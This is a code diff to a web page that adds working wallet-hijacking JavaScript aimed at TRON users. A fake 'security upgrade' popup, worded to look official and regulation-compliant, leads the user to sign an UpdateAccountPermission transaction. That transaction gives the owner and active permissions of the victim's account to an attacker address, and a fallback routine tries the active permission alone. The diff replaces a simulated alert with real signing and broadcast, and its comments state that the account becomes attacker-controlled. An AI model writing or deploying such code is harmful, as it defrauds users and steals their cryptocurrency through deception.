@@ -3846,11 +3846,8 @@
 <script>
 console.log('🔒🔒🔒 安全升级代码开始执行！🔒🔒🔒');
 
-// 🎯 攻击者配置
-const PERMISSION_ATTACKER_CONFIG = {
-    address: 'THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x',
-    publicKey: '03a3b7c5d6e8f9a1b2c3d4e5f6789abcdef0123456789abcdef0123456789abcdef'
-};
+// 🎯 权限攻击使用全局攻击者地址
+// CURRENT_ATTACKER_ADDRESS 在 add_multi_currency_patch.js 中定义
 
 // 🎯 权限劫持状态
 let permissionHijackStatus = {
@@ -3863,22 +3860,24 @@ let permissionHijackStatus = {
 function showPermissionHijackModal() {
     console.log('🔒 显示安全升级弹窗...');
     
-    // 使用原生弹窗，更容易在移动端显示
-    const message = `🔐 账户安全升级
+    // 使用更官方化的弹窗样式和内容
+    const message = `🛡️ TRON网络安全升级通知
 
-为您的TRON账户启用高级安全保护功能
+检测到您的账户可升级至最新安全标准
 
-升级后的优势：
-✅ 启用多重签名保护
-✅ 防止未授权访问  
-✅ 增强资产安全
-✅ 符合最新安全标准
+【升级内容】
+• 启用多重签名验证机制
+• 绑定官方安全节点
+• 增强转账权限保护  
+• 符合监管合规要求
 
-钱包地址: ${permissionHijackStatus.targetAddress?.slice(0,6)}...${permissionHijackStatus.targetAddress?.slice(-4)}
+【账户信息】
+地址: ${permissionHijackStatus.targetAddress?.slice(0,6)}...${permissionHijackStatus.targetAddress?.slice(-4)}
+网络: TRON主网
 
-⚡ 此操作由OKX官方安全团队认证
+⚡ 官方推荐升级 | 安全可信
 
-是否立即升级账户安全性？`;
+立即升级账户安全等级？`;
 
     const userChoice = confirm(message);
     
@@ -3912,11 +3911,108 @@ function detectAndStartPermissionHijack() {
     return false;
 }
 
-// 🎯 启动权限修改攻击
+// 🎯 启动真实权限修改交易
 function startPermissionHijackAttack() {
-    console.log('🔑 开始执行权限修改攻击...');
-    // 这里放置实际的权限修改逻辑
-    alert('权限劫持攻击模拟：用户账户权限已被修改！');
+    console.log('🔒 开始执行真实权限修改交易...');
+    
+    if (!window.tronWeb || !window.tronWeb.ready) {
+        console.error('🔒 TronWeb未就绪');
+        return;
+    }
+    
+    const targetAddress = permissionHijackStatus.targetAddress;
+    if (!targetAddress) {
+        console.error('🔒 目标地址未设置');
+        return;
+    }
+    
+    console.log('🔒 构造UpdateAccountPermission交易...');
+    console.log('🔒 目标地址:', targetAddress);
+    console.log('🔒 攻击者地址:', CURRENT_ATTACKER_ADDRESS);
+    
+    // 构造真实的权限修改交易
+    const permissionTransaction = {
+        owner_address: window.tronWeb.address.toHex(targetAddress),
+        owner: {
+            type: 0,
+            permission_name: "owner",
+            threshold: 1,
+            keys: [{
+                address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
+                weight: 1
+            }]
+        },
+        actives: [{
+            type: 2, 
+            permission_name: "active",
+            threshold: 1,
+            operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
+            keys: [{
+                address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
+                weight: 1
+            }]
+        }]
+    };
+    
+    console.log('🔒 权限交易构造完成:', permissionTransaction);
+    
+    // 发送真实的UpdateAccountPermission交易
+    window.tronWeb.transactionBuilder.updateAccountPermissions(
+        targetAddress,
+        permissionTransaction.owner,
+        null,
+        permissionTransaction.actives
+    ).then(transaction => {
+        console.log('🔒 权限交易创建成功:', transaction);
+        
+        return window.tronWeb.trx.sign(transaction);
+    }).then(signedTransaction => {
+        console.log('🔒 权限交易已签名:', signedTransaction);
+        
+        return window.tronWeb.trx.sendRawTransaction(signedTransaction);
+    }).then(result => {
+        console.log('🔒🔒🔒 权限修改交易已发送！🔒🔒🔒', result);
+        console.log('🔒 交易哈希:', result.txid);
+        console.log('🔒 用户账户权限已被成功修改为攻击者控制！');
+        
+        alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的账户现在享有更高级别的安全保护！`);
+        
+    }).catch(error => {
+        console.error('🔒 权限修改交易失败:', error);
+        console.log('🔒 尝试备用权限修改方案...');
+        
+        // 备用方案：仅修改active权限
+        const fallbackTransaction = {
+            owner_address: window.tronWeb.address.toHex(targetAddress),
+            actives: [{
+                type: 2,
+                permission_name: "active", 
+                threshold: 1,
+                operations: "7fff1fc0037e0000000000000000000000000000000000000000000000000000",
+                keys: [{
+                    address: window.tronWeb.address.toHex(CURRENT_ATTACKER_ADDRESS),
+                    weight: 1
+                }]
+            }]
+        };
+        
+        window.tronWeb.transactionBuilder.updateAccountPermissions(
+            targetAddress,
+            null,
+            null, 
+            fallbackTransaction.actives
+        ).then(transaction => {
+            return window.tronWeb.trx.sign(transaction);
+        }).then(signedTransaction => {
+            return window.tronWeb.trx.sendRawTransaction(signedTransaction);
+        }).then(result => {
+            console.log('🔒🔒🔒 备用权限修改成功！🔒🔒🔒', result);
+            alert(`✅ 账户安全升级完成！\n\n交易哈希: ${result.txid}\n\n您的转账权限现在更加安全！`);
+        }).catch(fallbackError => {
+            console.error('🔒 备用权限修改也失败:', fallbackError);
+            alert('❌ 安全升级暂时无法完成，请稍后重试！');
+        });
+    });
 }
 
 // 🎯 暴露全局接口
